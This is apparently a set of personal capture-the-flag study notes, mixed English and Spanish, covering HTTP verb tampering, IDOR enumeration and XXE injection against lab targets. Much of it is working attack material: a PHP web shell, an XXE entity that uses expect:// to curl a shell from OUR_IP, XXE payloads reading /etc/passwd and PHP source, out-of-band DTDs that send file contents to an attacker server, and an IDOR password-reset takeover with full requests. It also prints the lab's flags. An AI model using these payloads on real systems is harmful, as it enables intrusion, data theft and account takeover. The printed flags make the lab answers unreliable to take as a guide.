@@ -1,0 +1,420 @@
+HTTP Verb Tampering
+============================================================================================================
+  _________________________________________________________________________________________________
+ |                                                                                                 |
+ | An htto verbtampering attack exploits web servers that accept many http verb methods.           |
+ | Can be exploited by sending malicious  requests using unexpected methods, which may lead to     |
+ | bypassing the web applications authorization mechanism or even bypassing its security controls. |
+ |_________________________________________________________________________________________________|
+
+HTTP verbs:
+HEAD	Identical to a GET request, but its response only contains the headers, without the response body
+PUT	Writes the request payload to the specified location
+DELETE	Deletes the resource at the specified location
+OPTIONS	Shows different options accepted by a web server, like accepted HTTP verbs
+PATCH	Apply partial modifications to the resource at the specified location
+---------------------------------------------------------------------------
+- what makes HTTP Verb Tampering attacks more common (and hence more critical), is that they are caused by a misconfiguration in either the back-end web server or the web application
+-Insecure web server configurations cause the first type of HTTP verb atampering vulns.
+-Insecure coding practives cause the other type of HTTP verb tampering vulns.
+---------------------------------------------------------------------------
+-Cuando aparece la ventanita flotante del navegador pidiendo username y password, es ahi donde 
+ se puede aprovechat la vulnerabilidad de http verb tampering
+-si no tenemos credenciales, nos va a regresar el codigo 401 "unauthorized"
+-a la hora de indetificar si es o no vulnerable, se usa manipulan las cabeceras de las peticiones web de tal forma que en vez de "POST" usemos "HEAD" para inlcuir la direccion en este caso: "/admin/reset.php" y reenviarla.
+-si vamos atras, donde teniamos el panel de adminsistrador de archivos, podemosver que los archivos que tenia previamente la pagina, han sido elminados, lo que significa que explotamos exitosamente la vulnerabilidad sin acceso a ser administrador o ninguna otra credencial.
+-siempre probar haciendo click derecho en el request header y hacer click en "change request method" o meter
+ otros verbs que no esten en burpsuite (HEAD, PUT, DELETE, OPTIONS, PATCH) depende de lo que queramos hacer
+-when we got "malicious request denied", we may try an htto tampering attack to see if we can bypass the security filter altogether.
+----------------------------------------------------
+COMO PREVENIR EL BYPASSING CON HTTP VERBS?
+tan sencillo como limitar la cantidad de verbs a solo una o dos get y post o solo get para que los usuarios externos no puedan solicitar mas opciones.
+----------------------------------------------------
+
+===============================================================================================================
+Insecure Direct Object References (IDOR)
+  _________________________________________________________________________________________
+ |                                                                                         |
+ | As web applications store users' files and information, they may use sequential         |
+ | numbers or user IDs to identify    each item. Suppose the web application lacks         |
+ | a robust access control mechanism and exposes direct references to files and resources. |
+ | In that case, we may access other users' files and information by simply guessing       |  
+ | or calculating their file IDs.                                                          |
+ |_________________________________________________________________________________________|
+
+- Insecure Direct Object References (IDOR)
+
+- Just exposing a direct reference to an internal object or resource is not a vulnerability in itself.
+
+- Web applications restrict users from accessing resources by restricting them from accessing the pages,
+ functions, and APIs that can retrieve these resources.
+
+- Exploit another vulnerability: a weak access control system
+
+- In such cases, manually manipulating HTTP requests may reveal that all users have full access to all data
+
+-  IDOR/Access Control vulnerabilities are found even in very large web applications, like Facebook, Instagram,
+  and Twitter.
+
+- look for URL parameters or APIs with an object reference (e.g. ?uid=1 or ?filename=file_1.pdf).
+   These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies.
+
+- frequently used hashing/encoding: base64, md5
+
+- if we see a reference like (?filename=ZmlsZV8xMjMucGRm), we can immediately guess that the file name is base64 encoded (from its character set)
+
+- On the other hand, the object reference may be hashed, like (download.php?filename=c81e728d9d4c2f636f067f89cc14862c).
+
+ we may see what is being hashed before the API call is made:
+ Code: javascript
+$.ajax({
+    url:"download.php",
+    type: "post",
+    dataType: "json",
+    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
+    success:function(result){
+        //
+    }
+});
+----------------------------------------------------
+JavaScript Object Notation (JSON) es el formato de intercambio de datos que lo hace posible. JSON se ha convertido en un formato de datos popular entre los desarrolladores debido a que su texto es legible por humanos, es ligero, requiere menos codificación y se procesa más rápido.
+es una alternativa a xml y se considera un formato independiente janvascript.
+----------------------------------------------------
+- static file IDOR is the most common and basic IDOR vulnerability
+----------------------------------------------------
+
+
+------------------------
+|Mass IDOR enumeration:|
+------------------------
+step1- send web requests and use burpsuite to intercept the request
+step2- send the header to repeater as post method (check that "POST method" is being used)
+step3- send the POST request to the intruder and fuzz for uid=[] parameter from 1 to 20
+step4- now burpsuite are currently fuzzing parameters in /documents.php web page
+step5- we found that uid=15 have a .txt with the flag
+
+---------------------------------------
+
+for i in {1..20}; do echo -n $i | md5sum | tr -d ' -'; done > md5encoded.txt
+
+-------------------------------
+|bypassing encoded references:|
+-------------------------------
+step1- this time we dont need to change the request method to POST
+step2- only use the burp proxy at "GET /download.php?uid=1&contract=MQ%3D%3D"
+step3- send this request to repeater 
+step4- once we have the response, check if it looks like: [Content-Disposition: attachment; filename="contract_c4ca4238a0b923820dcc509a6f75849b.pdf"]
+step5- if it looks right, send in GET method the request to the intruder
+step6- fuzz in /download.php?contract=§[HERE]§
+step7- add the numbers in payload settings and base-64, url-encode key characters in payload processing
+step8- fuzz and the flag at the biggest number in legth column at the intruder attack
+-------------------------------------------------
+-----------------------
+|IDOR in insecure APIs|
+-----------------------
+step1- check the request by clikcing on "update profile" ---> http://94.237.56.76:41124/profile/index.php
+step2- check for api vulnerabilities:
+step3- once we understand how apis works, at the burpsuite proxy window, let's send the request to repeater
+step4- as we can see, is a put method and we are sending request to /profile/api.php/profile/1, so, that "api.php" appears to be buggy
+step5- let's try the burp proxy at /profile/api.php/profile/2 
+step6- ok we got another user id and role, cuz is another user 
+step7- let's try using the intruder and set the payload position at /§2§ to charge a wordlist in the profile number
+step8- find between the requests and locate the flag at the responses. 
+
+-------------------------------------------------
+-------------------------
+|Chaining IDOR vulns    |                     
+-------------------------
+step1- use the intruder like the last flag to combine the user number at /profile/[wordlist]
+step2- check the admin uuid, role, uid, and the email
+step3- send the intruder response with admin values, modify the values that you need
+step4- the response will have to respond with a different value, below "Content-Type", if the repsonse change, it works
+step5- now the values have been modified, send a normal request to edit page to see the flag at "edit profile" 
+ 
+===============================================================================================================
+XML External Entity (XXE) Injection
+   ____________________________________________________________________________________
+  |                                                                                    |
+  | Many web applications process XML data as part of their functionality.             |
+  | Supose a web application utilizes utdated XML libraries to parse and process XML   |
+  | input data from the front-end user In that case, it may possible to send malicious |
+  | XML data to disclose local files stored on the back-end server. These files may be |
+  | configuration files that may contain sensitive information.                        |
+  |____________________________________________________________________________________|
+
+  resources to get JSON format from another formats:
+  https://www.convertjson.com/json-to-xml.htm
+  https://www.convertonline.io/convert/query-string-to-json
+  https://codebeautify.org/string-to-json-online
+  https://jsonformatter.org/
+  https://www.convertcsv.com/csv-to-json.htm
+  https://www.convertsimple.com/convert-javascript-to-json/a
+
+
+
+                           _________________
+                          | P A Y L O A D S |
+ _________________________|_________________|_____________________________________
+| echo '<?php system($_REQUEST["cmd"]);?>' > shell.php                            
+| sudo python3 -m http.server 80                                                  
+| ------------------------------------------------------------------------------- 
+| <!DOCTYPE email [                                                               
+|  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">           
+|  ]>                                                                             
+|                                                                                 
+|  <!DOCTYPE xxeinjection [ <!ENTITY company SYSTEM "file:///etc/passwd"> ]>      
+|                                                                                 
+|  <!DOCTYPE xxeinjection [ <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php"> ]   >
+|
+|
+|
+|
+|
+|_________________________________________________________________________________
+
+https://www.thehacker.recipes/web/inputs/xxe-injection
+https://www.thehacker.recipes/web/inputs/ssrf
+https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
+https://gtfobins.github.io/gtfobins/php/#file-read
+https://github.com/payloadbox/rfi-lfi-payload-list
+ ________________________________    ------------------------------------------------------------------
+| XXE to local file disclousure: |
+|________________________________|
+<!DOCTYPE xxeinjection [ <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php"> ]>
+
+ ___________________________  -----------------------------------------------------------------
+| Advanced file disclousure:|
+|___________________________|
+
+===========================================================================================
+|  PAYLOAD 1         |  
+=====================
+
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/error/flag.php"> 
+   <!ENTITY % start "<![CDATA["> 
+   <!ENTITY % end "]]>">
+   <!ENTITY % all "<!ENTITY fileContents 
+   '%start;%file;%end;'>">
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE email [
+
+  <!ENTITY % dtd SYSTEM
+
+  "http://10.10.15.152:8000/xxe.dtd">
+
+  %dtd;
+
+  %all;
+
+]>
+
+<email>
+
+&fileContents;
+
+</email>
+
+=======================================================================
+|         PAYLOAD2            |
+===============================
+at:
+/error/submitDetails.php
+
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE email [ 
+
+  <!ENTITY % remote SYSTEM "http://10.10.15.152:8000/xxe.dtd">
+
+  %remote;
+
+  %error;
+
+]>
+
+<email>
+
+&remote;
+
+</email>
+
+===================================================================
+xxe.dtd FILE:|
+==============
+  <!ENTITY % file SYSTEM "file:///flag.php">
+  <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+
+
+======================================================================================
+
+_____________________________+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+||| OUT OF BAND XXE (OOB) |||
+______________________________
+
+xxe.dtd file:
+
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.15.152:8000/?content=%file;'>">
+
+----------------------------------
+
+POST REQUEST HEADER:
+
+POST /blind/submitDetails.php HTTP/1.1
+
+Host: 10.129.76.120
+
+Content-Length: 170
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+
+Content-Type: text/plain;charset=UTF-8
+
+Accept: */*
+
+Sec-GPC: 1
+
+Accept-Language: en-US,en
+
+Origin: http://10.129.76.120
+
+Referer: http://10.129.76.120/
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+
+  <!ENTITY % remote SYSTEM "http://10.10.15.152:8000/xxe.dtd">
+
+  %remote;
+
+  %oob;
+
+]>
+
+<root>&content;</root>
+
+---------------------------------------------------------------
+
+php -S 0.0.0.0:8000   PYTHON SERVER RSPONSE:
+
+
+/?content=PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K
+
+DECODE AS BASE64 RESULT (AT THE BOTTOM OF THE RESPONSE):
+ <?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>
+
+=====================================================================================================
+ _________________________________________________
+|                                                 |
+|                 SKILLS ASSESSMENT               |
+|_________________________________________________|
+
+
+
+1- send the request thorught burpsuite proxy send to the repeater and see the response
+2- we can see that line is an api:
+                $(document).ready(function() {
+            fetch(`/api.php/user/${$.cookie("uid")}`, {
+                method: 'GET'
+            }
+
+3- as we can see the path "/api.php/user/[uid]" can be accessed
+4- now we have to use the burp intruder to search for uids at /api.php/user/[wordlist]
+5- found that the user 52 have administrator privileges, so 
+                {"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
+
+6- at /settings.php we have this lines:
+                           $("#error_string").html('');
+                fetch(`/api.php/token/${$.cookie("uid")}`, {
+                    method: 'GET'
+                }
+
+7- request to the api token path (/api.php/token/52) and we can retrieve: {"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
+8- now we need to send a request to reset the password:
+
+GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=luis HTTP/1.1
+Host: 83.136.252.24:32887
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
+Sec-GPC: 1
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=j5qsohd2akq634l3rg94rf8tvl; uid=74
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+
+9- we can login as a.corrales and password: a.corrales
+10- create new event, user burp to see the request and repsonse 
+11- send now the request at: /addEvent.php in order to add an xxe payload:
+                  
+                   <?xml version="1.0"?>
+
+<!DOCTYPE b [
+
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+
+]>
+            <root>
+            <name>&xxe;</name>
+            <details>b</details>
+            <date>2023-02-05</date>
+            </root>
+
+12- get the flag by sending this payload and decode the base64 string:
+
+<?xml version="1.0"?>
+
+<!DOCTYPE b [
+
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
+
+]>
+            <root>
+            <name>&xxe;</name>
+            <details>b</details>
+            <date>2023-02-05</date>
+            </root>
+
+
+13- HTB{m4573r_w3b_4774ck3r}
+_______________________________
+tener en cuenta y probar siempre:
+php://filter/convert.base64-encode/resource=index.php
+
+php://filter/resource=flag.txt
+
+Note: PHP wrapper can be chained multiple time, example:
+php://filter/convert.base64-encode|convert.base64-decode/resource=index.php
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
